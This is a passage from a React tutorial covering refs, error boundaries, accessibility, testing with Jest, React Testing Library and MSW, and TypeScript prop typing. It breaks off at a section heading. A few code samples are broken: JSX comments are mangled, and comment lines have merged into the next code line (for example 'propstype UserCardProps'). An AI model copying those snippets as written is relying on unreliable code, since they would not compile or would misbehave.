#### 219. Mutable Refs (The Instance Variable Pattern):

You can also use refs as a generic container to store any mutable value that needs to persist across renders without triggering a new render when it changes. This makes it perfect for storing timer IDs, previous state values, or tracking flags.

```jsx
import { useState, useRef } from "react";

function Timer() {
  const [seconds, setSeconds] = useState(0);
  const timerIdRef = useRef(null); // Keeps track of interval ID without re-rendering

  const startTimer = () => {
    if (timerIdRef.current !== null) return;

    timerIdRef.current = setInterval(() => {
      setSeconds((prev) => prev + 1);
    }, 1000);
  };

  const stopTimer = () => {
    clearInterval(timerIdRef.current);
    timerIdRef.current = null; // Clear reference safely
  };

  return (
    <div>
      <p>Time elapsed: {seconds}s</p>
      <button onClick={startTimer}>Start</button>
      <button onClick={stopTimer}>Stop</button>
    </div>
  );
}
```

---

### 220. Ref Encapsulation & Cross-Component Communication - Forwarding Refs (forwardRef):

By default, you cannot pass a ref prop to custom, user-defined React components. If you try, React will throw a console warning and assign undefined because component boundaries are encapsulated for safety.

To expose an internal DOM node from a child component up to its parent, you must wrap the child component inside the forwardRef utility function. This utility injects the parent's ref as a distinct second argument right after props.

```jsx
import { forwardRef, useRef } from "react";

// 1. Child Component explicitly forwards its ref down to the native input element
const CustomInput = forwardRef((props, ref) => {
  return <input ref={ref} className="styled-input" {...props} />;
});

// 2. Parent Component can now pass a ref naturally
function ParentController() {
  const customInputRef = useRef(null);

  const focusChild = () => {
    customInputRef.current.focus();
  };

  return (
    <div>
      <CustomInput ref={customInputRef} placeholder="Forwarded ref input" />
      <button onClick={focusChild}>Focus Child Component</button>
    </div>
  );
}
```

---

### 221. Imperative Methods (useImperativeHandle):

While forwardRef gives parents full, unrestricted access to a child's raw DOM node, this breaks strict encapsulation. A parent could accidentally alter internal styles, remove classes, or modify values it shouldn't touch.

The `useImperativeHandle` hook limits this exposure. It allows you to customize the object instance that the parent receives when using a ref, exposing only specific, controlled imperative methods while completely hiding the raw DOM node.

```jsx
import { forwardRef, useRef, useImperativeHandle } from "react";

const VideoPlayer = forwardRef((props, ref) => {
  const videoRef = useRef(null);

  // Expose ONLY play and pause to the parent, hiding the actual video node
  useImperativeHandle(ref, () => ({
    triggerPlay: () => {
      videoRef.current.play();
    },
    triggerPause: () => {
      videoRef.current.pause();
    },
  }));

  return <video ref={videoRef} src="video.mp4" width="300" />;
});

function Dashboard() {
  const playerRef = useRef(null);

  return (
    <div>
      <VideoPlayer ref={playerRef} />
      {/_ The parent calls the exposed abstract methods safely _/}
      <button onClick={() => playerRef.current.triggerPlay()}>Play</button>
      <button onClick={() => playerRef.current.triggerPause()}>Pause</button>
    </div>
  );
}
```

---

### 222. Practical Browser Use Cases - Focus Management:

Managing browser focus programmatically is critical for accessibility (a11y) and smooth user experiences. Common scenarios include:

- Moving focus to the first input field inside a Modal component immediately after it opens.
- Returning focus back to an "Edit" toggle button after a user closes a configuration overlay.
- Redirecting focus to an error summary element at the top of a page following an unsuccessful form submission.

#### Using standard DOM manipulation (document.getElementById()) breaks React’s state model. Utilizing unique component-bound useRef tokens ensures your focus management logic remains scoped exclusively to that specific component instance.

### 223. Measuring DOM Elements:

Sometimes you need to calculate the actual physical layout dimensions of an element (such as width, height, or layout offset values) before rendering conditional layouts.

While you can read dimensions inside a useEffect hook using a standard ref, doing so can cause visible visual layout flashes if your state changes trigger an immediate second layout calculation pass. To handle layout measurements smoothly, React provides a specialized hook variant: `useLayoutEffect`.

```jsx
import { useState, useLayoutEffect, useRef } from "react";

function ElementMeasurer() {
  const boxRef = useRef(null);
  const [dimensions, setDimensions] = useState({ width: 0, height: 0 });

  // useLayoutEffect fires synchronously BEFORE the browser paints pixels to the screen
  useLayoutEffect(() => {
    if (boxRef.current) {
      const rect = boxRef.current.getBoundingClientRect();
      setDimensions({
        width: rect.width,
        height: rect.height,
      });
    }
  }, []); // Run once on mount

  return (
    <div>
      <div
        ref={boxRef}
        style={{ width: "50%", padding: "20px", background: "lightgray" }}
      >
        Target Measurement Zone
      </div>
      <p>
        Width: {dimensions.width}px | Height: {dimensions.height}px
      </p>
    </div>
  );
}
```

---

### 224. Advanced Ecosystem Integration - Integrating with Non-React Libraries:

Large-scale legacy codebases often feature complex, standalone JavaScript tools that manage their own separate DOM fragments—such as charting packages (D3.js, Chart.js), map utilities (Leaflet, Mapbox), or rich animation timelines (GSAP).

To safely merge these tools into a modern React application, use a ref to hand off a clean DOM container node to the third-party ecosystem. This serves as a blank canvas where the external library can build out its layout manually, isolated from React's Virtual DOM updates.

```jsx
import { useEffect, useRef } from "react";
import SomeLegacyChartLibrary from "legacy-charts";

function AnalyticsWrapper({ data }) {
  const chartContainerRef = useRef(null);
  const chartInstanceRef = useRef(null); // Keep a pointer to the chart instance across renders

  // 1. Initialize the external library once when the component mounts
  useEffect(() => {
    if (chartContainerRef.current) {
      chartInstanceRef.current = new SomeLegacyChartLibrary(
        chartContainerRef.current,
        {
          theme: "dark",
          interactive: true,
        },
      );
    }

    // Clean up and completely tear down the instance when leaving the screen
    return () => {
      if (chartInstanceRef.current) {
        chartInstanceRef.current.destroy();
      }
    };
  }, []);

  // 2. Stream subsequent reactive updates directly to the external instance method
  useEffect(() => {
    if (chartInstanceRef.current) {
      chartInstanceRef.current.updateDataPoints(data);
    }
  }, [data]); // Push updates whenever the data prop changes

  return (
    <div className="chart-card">
      <h3>Live Network Activity</h3>
      {
        /_ React renders the shell div container; the external library takes it from here _/
      }
      <div ref={chartContainerRef} className="native-chart-mount-point" />
    </div>
  );
}
```

---

## 22. <u> Error Handling </u> -

### 225. Component Rendering Fault Tolerance - Error Boundaries:

In early versions of React, an unhandled JavaScript error thrown inside any single component's rendering loop would corrupt React's internal state. This caused the entire application to crash and blank out the user's screen.

To solve this, React introduced Error Boundaries. These are specialized components that function like a global try/catch block for your user interface. They catch JavaScript errors anywhere in their child component tree, log the error, and display a fallback UI instead of letting the entire page crash.

#### Strict Boundaries & Exclusions:

Error Boundaries catch errors that occur during:

- Component rendering phases.
- Lifecycle methods (e.g., useEffect or class lifecycle methods).
- The constructor phases of the child tree.

However, Error Boundaries do not catch errors that occur within:

- Asynchronous code (e.g., setTimeout, requestAnimationFrame, or active fetch requests).
- Event handlers (e.g., an error thrown inside an onClick callback).
- Server-side rendering (SSR) processes.
- The Error Boundary component itself (it can only catch errors thrown by its children).

---

### 226. Class Components for Error Boundaries:

As of 2026, React requires Error Boundaries to be written as Class Components. The modern hooks API (useEffect, useState) does not yet have equivalents for React's specialized error lifecycle methods: `getDerivedStateFromError` and `componentDidCatch`.

```jsx
import React, { Component } from "react";

export default class ErrorBoundary extends Component {
  constructor(props) {
    super(props);
    // Initialize standard error state flags
    this.state = { hasError: false, error: null };
  }

  // 1. Static lifecycle method to modify state ahead of rendering the fallback
  static getDerivedStateFromError(error) {
    // Returns an object that merges directly into local state
    return { hasError: true, error };
  }

  // 2. Lifecycle method used to perform side effects, like logging errors
  componentDidCatch(error, errorInfo) {
    console.error("ErrorBoundary intercepted a crash:", error);
    console.log("Component stack trace:", errorInfo.componentStack);

    // Example: sendErrorToTelemetryService(error, errorInfo.componentStack);
  }

  render() {
    if (this.state.hasError) {
      // Render fallback UI if an error occurred
      return (
        this.props.fallback || (
          <div className="error-panel">
            <h2>Application Error</h2>
            <p>Something went wrong within this section of the app.</p>
          </div>
        )
      );
    }

    // Render children normally if no errors occurred
    return this.props.children;
  }
}
```

#### getDerivedStateFromError vs. componentDidCatch:

- getDerivedStateFromError(error): This method runs during the render phase immediately after an error is thrown. It must remain pure and cannot trigger side effects. It's sole purpose is to return an updated state object (e.g., { hasError: true }) so React can render your fallback UI on the very next frame without flashing a broken interface.
- componentDidCatch(error, errorInfo): This method runs during the commit phase after the fallback UI has mounted. This is where you perform imperative side effects, such as logging the error stack trace to an external tracking service.

---

### 227. Asynchronous & Event-Level Failures - Try/Catch in Async Code & Event Handlers:

Because asynchronous code and event handlers run completely outside of React's main rendering loop, errors thrown within them will not trigger an Error Boundary. You must handle these failures manually using standard JavaScript try/catch statements.

```jsx
import { useState } from "react";

function UserProfileCard() {
  const [userData, setUserData] = useState(null);
  const [localError, setLocalError] = useState(null);

  const handleFetchProfile = async () => {
    try {
      setLocalError(null);
      const res = await fetch("https://example.com");
      if (!res.ok) throw new Error("Could not retrieve remote user profile.");
      const data = await res.json();
      setUserData(data);
    } catch (err) {
      // Intercept async failure locally and update UI state manually
      setLocalError(err.message);
    }
  };

  if (localError)
    return <p className="alert">Failed to load profile: {localError}</p>;
  return <button onClick={handleFetchProfile}>Load Profile</button>;
}
```

#### Routing Event Errors to an Error Boundary:

If you want an event handler or async error to bubble up and trigger an Error Boundary, you can force React to evaluate the error during the rendering phase. You do this by catching the error asynchronously, storing it in state, and throwing it during the next render cycle.

```js
const [error, setError] = useState(null);
if (error) throw error; // Thrown during rendering, so the parent Error Boundary will catch it.
```

---

### 228. Architecture & Telemetry Patterns - Error Boundary Placement Patterns:

You can place Error Boundaries at different levels of your application structure to balance resilience with user experience.

#### 1. The Global Monolithic Boundary:

Placing a single Error Boundary at the absolute root of your component tree (wrapping the `<App />` component) acts as a final safety net. If any part of your app crashes, it replaces the entire screen with a global error page. While this prevents a blank screen, it ruins the user experience for minor bugs.

#### 2. Granular Widget-Level Isolation:

Wrapping individual, non-critical dashboard elements (such as a sidebar notifications list, a weather widget, or an analytics graph) in their own separate Error Boundaries ensures that a crash in one widget is contained. The rest of the dashboard remains fully functional, while the broken widget gracefully displays an isolated error card.

```js
function Dashboard() {
  return (
    <div className="layout">
      <Navbar />
      <div className="content">
        {/* If the graph crashes, the sidebar and nav bar stay interactive */}
        <ErrorBoundary
          fallback={<div className="card">Chart unavailable.</div>}
        >
          <HeavyAnalyticsGraph />
        </ErrorBoundary>
        <MainSidebar />
      </div>
    </div>
  );
}
```

---

### 229. Global Fallback UI Design:

A well-designed fallback UI should reduce user frustration and help them recover from the error. Good fallback UIs include:

- Clear Explanations: Use plain language to explain that a section crashed, avoiding confusing code stack dumps.
- State Preservation Alerts: Let users know if their unsaved form inputs are safe or if they need to back up data.
- Recovery Mechanisms (Reset Buttons): Provide a "Clear Cache & Retry" button that resets the Error Boundary's internal state to let the user try reloading the component.

```js
// Resetting state within an Error Boundary component
handleReset = () => {
  this.setState({ hasError: false, error: null });
};
```

---

### 230. Logging Errors & Telemetry Integration:

In production environments, you shouldn't rely on users reporting errors. Your application needs an automated logging system to capture and monitor issues in real time.

When an Error Boundary's `componentDidCatch` method captures a crash, it should forward a structured payload to a telemetry service like `Sentry`, `LogRocket`, or `Datadog`.

```js
{
  "timestamp": "2026-07-21T14:20:00.000Z",
  "environment": "production",
  "releaseVersion": "v4.2.1",
  "errorMessage": "Cannot read properties of undefined (reading 'map')",
  "url": "https://myapp.com",
  "componentStack": "\n in HeavyAnalyticsGraph (at Dashboard.jsx:8)\n in ErrorBoundary (at Dashboard.jsx:7)"
}
```

#### Source Maps for Tracking:

Because production JavaScript code is minified and bundled, error stack traces often point to unreadable, compressed files (e.g., main.min.js:1:4300).

To fix this, configure your build tools (Vite, Webpack) to generate Source Maps and upload them privately to your logging platform. This translates the minified production errors back into your original source code file names and line numbers, making debugging straightforward.

---

## 23. <u> Accessibility (a11y) </u> -

### 231. Structural Foundations - Semantic HTML:

Semantic HTML means using web elements for their intended, native programmatic meaning rather than styling generic boxes to simulate layouts. Web browsers and assistive devices have predefined structural expectations for semantic components.

- Native Elements: Elements like `<button>`, `<nav>`, `<main>`, `<article>`, and `<header>` instantly establish an understandable architectural canvas for screen readers.
- The Div-Soup Bottleneck: Overusing `<div>` and `<span>` elements for interactive elements wipes out accessibility metadata. A `<div>` styled to look like a button lacks built-in keyboard interaction mechanics, screen reader roles, and focus capabilities unless you write extensive custom fallback code.

### React Fragments (`<React.Fragment> / <>`):

A common issue in React development occurs when mapping arrays or splitting layout structures into components. Developers often wrap sibling child nodes inside a generic container `<div>` simply to satisfy the rule that React components must return a single root node. This breaks HTML layouts (like tables, lists, or flexbox layouts).

React Fragments let you group sibling child nodes together seamlessly without adding an actual, invalid wrapper node to the final DOM output.

```jsx
// Breaks table structure by rendering invalid nesting: <table><tr><div><td>...
function BadColumns() {
  return (
    <div>
      <td>Data Column 1</td>
      <td>Data Column 2</td>
    </div>
  );
}

//  Maintains clean semantic layout structure in the DOM
function GoodColumns() {
  return (
    <>
      <td>Data Column 1</td>
      <td>Data Column 2</td>
    </>
  );
}
```

---

### 232. ARIA Attributes & Roles:

When custom designs require you to build intricate elements that native HTML cannot provide (such as multi-tab panels, custom sliders, or tree views), you must use **`Accessible Rich Internet Applications`** (ARIA) specs to communicate state to assistive technologies.

### ARIA Roles:

Roles describe what a custom element is or does. Examples include `role="dialog"` for a popup modal, `role="tooltip`, or `role="alert"` for live error cards.

### ARIA States & Properties:

These attributes communicate dynamic element states that change as the user interacts with the application.

- aria-expanded="true/false": Signals if a dropdown menu or accordion fold is currently open.
- aria-checked="true/false": Tracks selection states on custom-designed checkbox switches.
- aria-live="polite/assertive": Identifies regions where text changes should be instantly announced aloud by screen readers (e.g., live toast notifications or form error updates). [25, 26, 27, 28, 29]

### JSX Attribute Syntax Difference:

Unlike standard HTML where attributes are written in lower-case hyphenated text, all aria-\* attributes are fully supported and written exactly the same way in React JSX (hyphenated lowercase). This contrasts with most camelCase React properties (like className or onClick).

```jsx
// Correct JSX formatting for ARIA properties
<button
  aria-label="Close notification panel"
  aria-expanded={isPanelOpen}
  onClick={() => setIsPanelOpen(false)}
>
  ×
</button>
```

---

### 233. Interactive Navigation Patterns - Keyboard Navigation & Focus Management:

An accessible web application must be fully functional without using a mouse. This is essential for users with visual, motor, or cognitive disabilities, as well as power users who rely exclusively on keyboard navigation.

### Keyboard Event Handlers:

If you must add click actions to non-interactive elements, you must also listen for keyboard triggers (Enter and Space keys) so keyboard-only users can activate the element.

```jsx
function AccessibleClickableBox({ onClick }) {
  const handleKeyDown = (event) => {
    if (event.key === "Enter" || event.key === " ") {
      event.preventDefault(); // Prevent standard page space scrolling
      onClick();
    }
  };

  return (
    <div
      role="button"
      tabIndex={0} // Makes the non-interactive div focusable via the Tab key
      onKeyDown={handleKeyDown}
      onClick={onClick}
    >
      Interactive Element
    </div>
  );
}
```

#### The tabIndex Attribute:

- `tabIndex={0}`: Places an element into the natural keyboard tab navigation order of the page based on its location in the source code.
- `tabIndex={-1}`: Removes an element from the sequential tab order, but allows you to focus it programmatically via JavaScript code **(element.focus())**.
- `Avoid Positive tabIndex (tabIndex={1}+)`: Hardcoding positive integer tab orders is an anti-pattern. It breaks the expected top-to-bottom tab sequence and becomes unmanageable as your component tree layout changes.

---

### 234. Programmatic Focus Management & Focus Traps - React Refs for Moving Focus:

When a user interaction dynamically mounts a major layout change—like opening a modal popup or changing page paths—you must programmatically shift focus to the new element so the user can continue navigating seamlessly.

```jsx
import { useEffect, useRef } from "react";

function ModalOverlay({ isOpen, onClose }) {
  const headingRef = useRef(null);

  useEffect(() => {
    if (isOpen && headingRef.current) {
      // Direct screen reader focus to the modal header immediately on mount
      headingRef.current.focus();
    }
  }, [isOpen]);

  if (!isOpen) return null;

  return (
    <div role="dialog" aria-modal="true" className="modal">
      {/* tabIndex={-1} allows programmatic focus without polluting tab flow */}
      <h2 ref={headingRef} tabIndex={-1}>
        Configuration Settings
      </h2>
      <button onClick={onClose}>Dismiss</button>
    </div>
  );
}
```

#### Focus Trapping Explained:

When a modal dialog or overlay box opens, keyboard focus must be trapped inside that container. If a user presses Tab at the very last interactive element inside the modal, focus should wrap around to the first item inside the modal rather than escaping to interactive elements hidden behind the backdrop.

In modern production environments, you can implement this robustly by wrapping components inside established tools like react-focus-lock or using headless asset libraries like Radix UI or React Aria.

---

### 235. Content Visibility & Input Design - Screen Readers & Hidden Elements:

Screen readers read text content to convey page layouts. Sometimes, you need to toggle element visibility carefully to optimize what a screen reader announces versus what is visible on the screen.

#### Hiding Methods Summary:

1.  display: none or visibility: hidden (CSS): Completely removes the element from both the visual screen and the screen reader accessibility tree.
2.  aria-hidden="true": Leaves the element visible on the screen, but instructs screen readers to completely skip reading it (perfect for decorative graphic icons, charts, or avatars).
3.  Visually-Hidden (SR-Only CSS Class): Keeps text fully readable within the screen reader accessibility tree, but visually hides it off-screen (used to provide extra textual context exclusively for blind users).

```css
/* Standard Utility Class for Screen-Reader Only Elements */
.sr-only {
  position: absolute;
  width: 1px;
  height: 1px;
  padding: 0;
  margin: -1px;
  overflow: hidden;
  clip: rect(0, 0, 0, 0);
  border: 0;
}
```

---

### 236. Accessible Forms:

Form inputs must always be explicitly linked to descriptive labels so screen readers can announce what information is required when an input field gains focus.

#### The htmlFor Attribute:

In standard HTML, you link a label to an input using the for attribute. Because _for_ is a reserved keyword in JavaScript, React JSX requires you to use htmlFor instead.

```jsx
function ContactForm() {
  return (
    <form>
      {/* Explicit linking via matching ID tokens */}
      <label htmlFor="userEmail">Corporate Email Address</label>
      <input id="userEmail" type="email" name="email" required />

      {/* Describing validation errors securely */}
      <label htmlFor="userBio">Short Biography</label>
      <textarea id="userBio" aria-describedby="bioHint" />
      <span id="bioHint" className="hint-text">
        Limit profile description to 250 characters.
      </span>
    </form>
  );
}
```

- aria-describedby: Points to the unique id of an external element containing secondary description text or real-time form validation errors, reading both values sequentially upon focus.

---

### 237. Color Contrast & Visual Design:

Text content must maintain a distinct, high-contrast ratio against its background color to remain legible for users with low vision or color blindness.

#### WCAG 2.1 Contrast Thresholds:

- AA Standard (Minimum Request): Requires a contrast ratio of at least 4.5:1 for standard text and 3:1 for large text (bold 18px+ or regular 24px+).
- AAA Standard (Enhanced Request): Requires a contrast ratio of at least 7:1 for standard text and 4.5:1 for large text structures.
- Don't Rely Solely on Color: Color should never be used as the only visual cue to convey state or instructions (e.g., an error input box shouldn't just turn red—it also needs an error icon or descriptive text).

---

### 238. Automation & Testing Toolchains - Accessibility Testing Methodologies -

#### 1. Automated Static Linting (eslint-plugin-jsx-a11y):

Integrate accessibility checks directly into your development workflow using the eslint-plugin-jsx-a11y plugin. This tool actively monitors your JSX code as you type, throwing immediate linter compiler warnings if it catches accessibility bugs.

```js
// Example .eslintrc configurations
{
  "plugins": ["jsx-a11y"],
  "extends": ["plugin:jsx-a11y/recommended"]
}
```

#### Core Linting Rules Enforced"

- alt-text: Throws errors if an `<img>` tag lacks a descriptive alt attribute.
- anchor-is-valid: Catches broken or invalid links (e.g., `<a href="#">` or `<a href={void(0)}>`).
- click-events-have-key-events: Validates that non-interactive components with click handlers also include keyboard handlers.
- no-noninteractive-element-interactions: Prevents assigning interactive event handles directly to static semantic layout tags like `<h1>` or `<p>`.

#### 2. Live Runtime Auditing (@axe-core/react):

While static linters catch simple structural bugs, they cannot audit dynamic elements or changing states. To test accessibility at runtime, you can integrate `@axe-core/react` into your development environment. This tool monitors the rendered DOM in your browser and logs accessibility violations directly to your browser's developer console.

```jsx
// main.jsx entry bootstrapper file
import React from "react";
import ReactDOM from "react-dom/client";
import App from "./App";

if (process.env.NODE_ENV !== "production") {
  const axe = await import("@axe-core/react");
  axe.default(React, ReactDOM, 1000); // Debounce interval delays report passes to 1 second
}

ReactDOM.createRoot(document.getElementById("root")).render(<App />);
```

#### 3. Manual Verification Checklist:

Automated utilities can only catch roughly 30% to 40% of all potential accessibility errors. To ensure full compliance, you must perform manual accessibility audits:

- Keyboard-Only Walks: Unplug your mouse entirely and verify you can navigate to every button, link, form input, and overlay using only the Tab, Shift + Tab, Enter, Space, and arrow keys.
- Screen Reader Testing: Activate built-in system screen readers (like VoiceOver on macOS/iOS or NVDA / JAWS on Windows) to verify that your page layout flows logically and changes match verbal descriptions.

---

## 24. <u> Testing </u> -

### 239. Architectural Strategy & Testing Hierarchy - The Testing Pyramid & Philosophies:

A reliable production application divides its automated verification strategy into three distinct testing tiers. Each tier balances execution speed and cost against real-world confidence.

```js

    / \      End-to-End (E2E) - High Confidence, Slow, Expensive
   /   \     ---------------------------------------------------
  /     \    Integration - Verifies component communication blocks
 /_______\   Unit - Fast, Isolated verification of raw pure code units

```

#### Unit Testing:

- Scope: Focuses entirely on testing the smallest possible blocks of code in absolute isolation (e.g., a single pure utility function, or a highly structured presentation component).
- Speed: Extremely fast; executes thousands of assertions in a matter of seconds.
- Trade-off: High precision for isolated logic, but provides zero confidence that separate modules will work together properly in production.

#### Integration Testing:

- Scope: Verifies that multiple components, state management systems, and side-effect engines communicate with each other correctly as a cohesive feature block.
- Philosophy: In React, this means mounting a feature branch (e.g., a full `RegistrationForm` including its validation logic, input blocks, and submission triggers) and verifying it behaves correctly as a unified system.

#### End-to-End (E2E) Testing:

- Scope: Tests the fully built application from the user's perspective by running it in a real browser environment connected to a live staging database.
- Confidence: Provides the highest level of confidence because it simulates exact real-world workflows.
- Trade-off: Slow to run, resource-heavy, and prone to flakiness due to network latency, timing issues, or external database state shifts.

---

### 240. React Testing Library (RTL) Philosophy:

The core philosophy of React Testing Library is: "The more your tests resemble the way your software is used, the more confidence they can give you."

- Avoid Testing Implementation Details: Older testing utilities (like Enzyme) focused heavily on auditing internal states, private component methods, or specific component child tree shallow counts. This meant that refactoring a component's internal architecture without changing its external behavior would still break your tests.
- User-Centric Behavioral Assertions: RTL forces you to interact with the rendered UI exactly like a real user would. Instead of searching for a component by its private class name or state variable index, your tests find elements by their visible text, screen reader accessible labels, or roles. This makes your test suite highly resilient to internal code refactoring.

---

### 241. Unit & Integration Toolchains - Jest:

Jest is a popular JavaScript testing framework designed to run, organize, and execute your test files.

- Test Runner: Scans your codebase for files matching .test.js or .spec.jsx patterns and executes them inside a terminal environment.
- Assertion Engine: Provides explicit evaluation matchers like expect(value).toBe(true) or expect(array).toContain(item).
- jsdom Environment: Because Jest runs within a terminal-bound Node.js engine, it simulates a standard web browser DOM using a lightweight package called jsdom. This allows you to mount and evaluate standard browser-facing React components directly inside your terminal window.

---

### 242. Component Testing with React Testing Library:

To test a component, use RTL’s render method to mount the element inside jsdom, then locate elements using query selectors and simulate interactions.

#### RTL Query Categories:

1.  getBy\*: Finds a matching element immediately. If no element is found, or if multiple elements match, it throws an error. (Best for items you expect to always be on the screen).
2.  queryBy\*: Finds a matching element immediately. If no element is found, it returns null instead of throwing an error. (Best for verifying an element is not present on the screen, like a closed modal).
3.  findBy\*: Returns a Promise that resolves when the matching element appears in the DOM. It will continually poll the layout up to a default timeout threshold (usually 1000ms). (Essential for handling asynchronous events, like waiting for an API response to load).

```jsx
import { render, screen } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import WelcomeBanner from "./WelcomeBanner";

test("renders user profile greeting and handles theme toggle interactions", async () => {
  // 1. Arrange: Mount the component shell
  render(<WelcomeBanner username="Alex" />);

  // 2. Act: Query the element by accessible role context and simulate a user click
  const greetingElement = screen.getByRole("heading", {
    name: /welcome back, alex/i,
  });
  expect(greetingElement).toBeInTheDocument();

  const toggleButton = screen.getByRole("button", {
    name: /toggle dark mode/i,
  });
  await userEvent.click(toggleButton); // user-event cleanly triggers hover, focus, and pointer events

  // 3. Assert: Verify the expected DOM mutation took place
  expect(toggleButton).toHaveTextContent(/disable dark mode/i);
});
```

---

### 243. Custom Hook Testing (renderHook):

Because hooks are simple JavaScript functions that rely on React's internal fiber layout mechanisms, you cannot execute them directly outside a component container. React Testing Library provides a specialized renderHook utility that wraps your hook inside a minimal virtual component shell to simulate its lifecycle safely.

```jsx
import { renderHook, act } from "@testing-library/react";
import useCounter from "./useCounter";

test("increments the counter value state properly", () => {
  // Mount the custom hook structure
  const { result } = renderHook(() => useCounter((initialValue = 10)));

  expect(result.current.count).toBe(10);

  // Any action that modifies internal state inside renderHook MUST be wrapped inside act()
  act(() => {
    result.current.increment();
  });

  expect(result.current.count).toBe(11);
});
```

---

### 244. Isolation, Mocking & Snapshots - Mocking Frameworks:

#### APIs & Modules:

To keep unit and integration tests fast and deterministic, you should isolate them from live network requests and heavy third-party systems.

#### 1. Mocking APIs with Mock Service Worker (MSW):

The industry standard for API mocking is `Mock Service Worker` (MSW). Instead of manually overriding global fetch or axios instances with brittle Jest function spies, MSW sets up an isolated mock server layer at the network level. This allows your components to make real HTTP requests that MSW intercepts and responds to with mock data, keeping your network layers identical to your production environment.

```jsx
import { http, HttpResponse } from "msw";
import { setupServer } from "msw/node";

// Define explicit mock interception endpoints
const server = setupServer(
  http.get("https://example.com", () => {
    return HttpResponse.json({ id: "usr_99", name: "Mocked User Data" });
  }),
);

beforeAll(() => server.listen());
afterEach(() => server.resetHandlers());
afterAll(() => server.close());
```

#### 2. Mocking Modules via Jest:

If a component relies on a heavy third-party module (like an analytical mapping system, chart engine, or navigation router wrapper), you can swap out that entire library asset file with an isolated mock definition block using `jest.mock()`.

```js
// Intercept and stub the entire react-router-dom package globally for this file
jest.mock("react-router-dom", () => ({
  ...jest.requireActual("react-router-dom"), // Keep original features intact
  useNavigate: () => jest.fn(), // Swap out useNavigate with an isolated function spy
}));
```

#### Snapshot Testing:

Snapshot testing matches the text serialization code of your component's current rendered DOM layout against a reference snapshot file saved alongside your test code during execution.

```jsx
import { render } from "@testing-library/react";
import StaticBadge from "./StaticBadge";

test("matches historical design format snapshot", () => {
  const { asFragment } = render(
    <StaticBadge label="Admin Access" color="red" />,
  );
  // Compares current markup code directly with saved .snap template file
  expect(asFragment()).toMatchSnapshot();
});
```

- Pros: Excellent for verifying that highly static presentational components (like SVG icon kits, design system badges, or raw alert panels) haven't accidentally changed their markup layout.
- Cons: Fragile and prone to noise. Changing a single utility class or adding an internal wrapper element can fail dozens of snapshot tests across your codebase, prompting developers to quickly accept changes (jest -u) without reviewing them. [54, 55]

---

### 245. Browser-Level Verification (E2E) - Cypress vs. Playwright:

When your testing requirements demand true browser-level verification across real environments, the testing workflow shifts to modern End-to-End frameworks.

#### Cypress:

- Architecture: Runs directly inside the actual browser execution window alongside your application code. This gives it native access to your application's DOM, network requests, and memory allocation.
- Features: Includes an exceptional, interactive visual timeline debugger that records full state snapshots for every command step, making troubleshooting straightforward.
- Limitations: Limited native cross-tab navigation capabilities, and running tests in parallel across large enterprise pipelines requires specialized orchestration configurations.

#### Playwright:

- Architecture: Created by Microsoft, Playwright operates completely out-of-process via modern browser debugging protocols (like Chrome DevTools Protocol).
- Cross-Browser Native Support: Can launch and control headless/headed instances of Chromium, WebKit (Safari), and Firefox simultaneously out of the box.
- Performance: Extremely fast execution speeds, built-in support for running tests in parallel, and highly resilient auto-waiting assertions that virtually eliminate timing-related test flakiness.
- Multi-Domain Capability: Features native support for complex multi-tab authentication workflows, cross-domain navigation, and geolocation spoofing.

---

### 246. Analysis & Best Practices - Test Coverage:

Test coverage utilities analyze your code execution paths while tests run, generating a percentage report across four distinct metrics:

1.  Statement Coverage: Has every single separate statement block line been executed?
2.  Branch Coverage: Has every decision branch logic loop (such as if, else, and switch scenarios) been verified?
3.  Function Coverage: Have all components and sub-functions declared been called?
4.  Line Coverage: The percentage of actual executable source code lines run by your test suite.

#### The 100% Coverage Illusion:

Chasing 100% code coverage is a common trap. High test coverage metrics only guarantee that your code was executed during testing—it does not mean your assertions are verifying correct behavior or handling unexpected edge cases. Prioritize writing meaningful assertions for high-value user paths over maximizing code execution metrics.

#### Testing Best Practices Summary:

- Interact via Accessibility Queries: Find your UI targets using user-focused queries like `screen.getByRole` or `screen.getByLabelText` before falling back to technical selectors like data-testid.
- Maintain Isolation: Tests must never share global mutable state or depend on the execution order of previous tests. Use beforeEach or afterEach hooks to clear mock caches and reset data structures.
- Keep Asynchronous Code Resilient: Always use asynchronous selection queries like await `screen.findBy*` along with explicit userEvent triggers when waiting for dynamic elements or state transitions to update the layout.
- Avoid Testing Third-Party Dependencies: Trust that well-maintained libraries (like React Router or Radix UI) thoroughly test their own packages. Focus your verification on your team's custom application code, configuration rules, and data handling.

---

## 25. <u> TypeScript with React </u> -

### 247. Foundation & Component Types - Strongly Typing Props:

In a React and TypeScript application, components are standard JavaScript functions. To enforce type safety, you must explicitly declare the structural shape of a component's incoming inputs (props) using either a type alias or an interface.

```tsx
// Using a type alias to define the shape of incoming
propstype UserCardProps = {
  username: string;          // Required primitive
  age: number;               // Required primitive
  isAdmin: boolean;          // Required primitive
  status?: 'active' | 'idle'; // Optional string literal union
  tags: string[];            // Array of strings
};

export function UserCard({ username, age, isAdmin, status = 'active', tags }: UserCardProps) {
  return (
    <div className={`card ${status}`}>
      <h3>{username} ({age})</h3>
      {isAdmin && <span className="badge">Admin Access</span>}
      <ul>{tags.map(tag => <li key={tag}>{tag}</li>)}</ul>
    </div>
  );
}
```

#### Passing Standard Nodes and HTML Attributes:

When building reusable layout elements, your custom components will often need to accept native React child nodes or standard HTML attributes (like custom styling classes or standard container IDs).

```tsx
import React from "react";

type ContainerProps = {
  title: string;
  // Accepts any valid renderable React node (elements, strings, fragments, portals)
  children: React.ReactNode;
  // Pulls in all standard HTML element styling definitions natively
  style?: React.CSSProperties;
};
export function Container({ title, children, style }: ContainerProps) {
  return (
    <section style={style} className="global-container">
      <h2>{title}</h2>
      {children}
    </section>
  );
}
```

---

### 248. Component Definition - FunctionComponent (React.FC):

You will frequently see components typed using the explicit wrapper token `React.FC` (or React.FunctionComponent).

```tsx
// Explicit definition using React.FCexport const AlertBox: React.FC<{ message: string }> = ({ message }) => {
  return <div className="alert">{message}</div>;
};
```

#### Modern Best Practice Strategy:

In modern React development, prefer typing the props directly on the function arguments rather than wrapping the component in React.FC.

- Standard function typing handles default properties cleaner.
- It works naturally with generic component bindings.
- It keeps code syntax simple and explicit.

#### Type-Safe Components:

Type-safe components ensure that errors are caught at compile time rather than during runtime in production. If a developer attempts to use your component without providing a required property, or accidentally passes an invalid data type (such as passing a string to an input expecting an array), the TypeScript compiler will immediately block the build.

---

### 249. State & Hook Typings - Typing State (useState):

